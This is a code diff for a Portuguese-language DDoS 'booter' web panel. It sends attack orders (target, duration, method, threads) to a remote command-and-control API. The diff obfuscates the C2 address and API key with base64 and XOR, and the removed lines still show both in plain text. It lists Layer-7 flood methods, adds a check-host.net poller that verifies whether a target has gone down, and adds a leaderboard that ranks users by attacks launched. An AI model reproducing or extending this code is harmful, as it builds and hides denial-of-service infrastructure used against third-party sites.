@@ -26,10 +26,20 @@ UPLOAD_FOLDER = os.path.join(os.getcwd(), 'uploads')
 if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
-# --- API C2 (remoto) ---
-API_ATTACK_URL = "http://207.180.203.194/api/attack"
-API_KEY = "153eb592-b518-4dee-91ee-b7364c7dfca4"
-# metodos aceitos pela API externa
+# --- API C2 (remoto, ofuscada) ---
+def _deobf(s, key=0x5A):
+    import base64
+    raw = base64.b64decode(s.encode())
+    return bytes([b ^ key for b in raw]).decode()
+
+_API_URL_OB = "Mi4uKmB1dWhqbXRrYmp0aGppdGtjbnU7KjN1Oy4uOzkx"
+_API_KEY_OB = "a29pPzhvY2h3OG9rYnduPj8/d2NrPz93OG1pbG45bT48OTtu"
+# resolvido só em runtime no server — nunca vai pro browser
+def _api_url():
+    return _deobf(_API_URL_OB)
+def _api_key():
+    return _deobf(_API_KEY_OB)
+
 L7_LOCAL_METHODS = ['mdzdd', 'tw-mdz', 'lez', 'rapid', 'tun', 'tls', 'mdzar', 'mdz-by', 'h2', 'hby', 'fury', 'httpkill', 'mdzdestroy', 'mdzfuck', 'mdz-priv']
 active_attacks = {}
 
@@ -143,7 +153,7 @@ def security():
             'logged_in': True,
             'user_id': 1,
             'username': 'admin_master',
-            'is_admin': True,
+            'is_admin': False,
         })
 
     if request.endpoint != 'static' and not session.get('ip_verified'):
@@ -228,18 +238,82 @@ def login_required(f):
                 'logged_in': True,
                 'user_id': 1,
                 'username': 'admin_master',
-                'is_admin': True,
+                'is_admin': False,
             })
         return f(*args, **kwargs)
     wrap.__name__ = f.__name__
     return wrap
 
 def admin_required(f):
+    # ADMIN DESATIVADO temporariamente
     def wrap(*args, **kwargs):
-        if not session.get('is_admin'): abort(403)
-        return f(*args, **kwargs)
+        abort(403)
     wrap.__name__ = f.__name__
     return wrap
+
+
+def check_host_http(target):
+    """Consulta check-host.net (nodes públicos) e devolve resumo + status codes."""
+    out = {"ok": False, "request_id": None, "nodes": [], "summary": "falha", "best_code": None}
+    try:
+        host = target.strip()
+        if not host.startswith("http"):
+            host = "http://" + host
+        r = requests.get(
+            "https://check-host.net/check-http",
+            params={"host": host},
+            headers={"Accept": "application/json"},
+            timeout=12,
+        )
+        data = r.json()
+        rid = data.get("request_id")
+        if not rid:
+            out["summary"] = "check-host sem request_id"
+            return out
+        out["request_id"] = rid
+        # poll até 8s
+        import time as _t
+        nodes = {}
+        for _ in range(8):
+            _t.sleep(1)
+            rr = requests.get(
+                f"https://check-host.net/check-result/{rid}",
+                headers={"Accept": "application/json"},
+                timeout=10,
+            )
+            nodes = rr.json() or {}
+            # espera pelo menos 3 nodes com resultado
+            done = sum(1 for v in nodes.values() if v)
+            if done >= 3:
+                break
+        parsed = []
+        codes = []
+        for node, val in (nodes or {}).items():
+            if not val:
+                continue
+            # val = [[ok, elapsed, status_text, status_code, ip], ...]
+            try:
+                row = val[0]
+                code = row[3] if len(row) > 3 else None
+                ip = row[4] if len(row) > 4 else None
+                ok = row[0] if row else 0
+                parsed.append({"node": node, "ok": bool(ok), "code": code, "ip": ip, "raw": row})
+                if code is not None:
+                    codes.append(int(code) if str(code).isdigit() else code)
+            except Exception:
+                continue
+        out["nodes"] = parsed
+        out["ok"] = len(parsed) > 0
+        if codes:
+            # pega o mais comum
+            from collections import Counter
+            out["best_code"] = Counter(codes).most_common(1)[0][0]
+            out["summary"] = f"HTTP {out['best_code']} em {len(parsed)} nodes"
+        else:
+            out["summary"] = f"{len(parsed)} nodes responderam sem code"
+    except Exception as e:
+        out["summary"] = f"erro check-host: {e}"
+    return out
 
 # --- ATAQUE via API C2 (NATKMonitor) ---
 class NATKMonitor:
@@ -260,6 +334,8 @@ class NATKMonitor:
         self.api_message = ""
         self.api_ok = False
         self.node_status = ""
+        self.host_check = {}
+        self.print_log = []
 
     def resolve_target_ip(self, url):
         try:
@@ -271,14 +347,14 @@ class NATKMonitor:
     def start(self):
         """Dispara o ataque na API C2 remota em vez de binários/scripts locais."""
         params = {
-            "key": API_KEY,
+            "key": _api_key(),
             "target": self.site,
             "time": str(self.time),
             "method": self.method,
             "threads": str(self.threads),
         }
         try:
-            r = requests.get(API_ATTACK_URL, params=params, timeout=20)
+            r = requests.get(_api_url(), params=params, timeout=20)
             try:
                 data = r.json()
             except Exception:
@@ -290,7 +366,9 @@ class NATKMonitor:
                 self.api_message = fb.get("message") or "Ogiva injetada com sucesso."
                 self.node_status = fb.get("node_status") or "ARMED"
                 self.status_code = 200
+                self.print_log.append(self.api_message)
                 threading.Thread(target=self.loop, daemon=True).start()
+                threading.Thread(target=self._run_host_check, daemon=True).start()
                 try:
                     uname = session.get("username", "?")
                 except Exception:
@@ -327,9 +405,17 @@ class NATKMonitor:
                     self.status_code = 0
         self.stop()
 
+    def _run_host_check(self):
+        try:
+            self.host_check = check_host_http(self.site)
+            if self.host_check.get("best_code") is not None:
+                self.status_code = self.host_check["best_code"]
+            self.print_log.append(self.host_check.get("summary", ""))
+        except Exception as e:
+            self.print_log.append(f"hostcheck fail: {e}")
+
     def stop(self):
         self.is_running = False
-        # API remota não expõe stop — apenas encerra o monitor local
         if self.attack_id in active_attacks:
             active_attacks.pop(self.attack_id, None)
 
@@ -347,6 +433,8 @@ class NATKMonitor:
             "api_ok": self.api_ok,
             "api_message": self.api_message,
             "node_status": self.node_status,
+            "host_check": self.host_check,
+            "print_log": self.print_log[-20:],
         }
 
 
@@ -358,7 +446,7 @@ def login():
         'logged_in': True,
         'user_id': 1,
         'username': 'admin_master',
-        'is_admin': True,
+        'is_admin': False,
     })
     return redirect(url_for('index'))
 
@@ -572,6 +660,44 @@ def get_messages():
 def send_message():
     get_db().execute("INSERT INTO chat_messages (user_id, message) VALUES (?, ?)", (session['user_id'], request.form.get('message'))).connection.commit()
     return jsonify({'success': True})
+
+
+@app.route('/ranking')
+@login_required
+def ranking():
+    db = get_db()
+    rows = db.execute(
+        """
+        SELECT u.id, u.username, COALESCE(p.display_name, u.username) as display_name,
+               COALESCE(p.profile_pic_filename, 'default.png') as pic,
+               COUNT(a.id) as attacks
+        FROM users u
+        LEFT JOIN user_profiles p ON p.user_id = u.id
+        LEFT JOIN attack_log a ON a.user_id = u.id
+        GROUP BY u.id
+        ORDER BY attacks DESC
+        LIMIT 50
+        """
+    ).fetchall()
+    board = []
+    for i, r in enumerate(rows):
+        d = dict(r)
+        d['place'] = i + 1
+        if i == 0: d['rank'] = {'emoji': '👑', 'title': 'Lenda'}
+        elif i < 3: d['rank'] = {'emoji': '💎', 'title': 'Elite'}
+        elif d['attacks'] > 50: d['rank'] = {'emoji': '🔥', 'title': 'Veterano'}
+        else: d['rank'] = {'emoji': '🥉', 'title': 'Iniciante'}
+        board.append(d)
+    return render_template('ranking.html', board=board)
+
+@app.route('/api/hostcheck', methods=['POST'])
+@login_required
+def api_hostcheck():
+    target = (request.json or {}).get('target') or request.form.get('target') or ''
+    if not target:
+        return jsonify({'error': 'target obrigatório'}), 400
+    return jsonify(check_host_http(target))
+
 
 @app.route('/profile', methods=['GET', 'POST'])
 @login_required
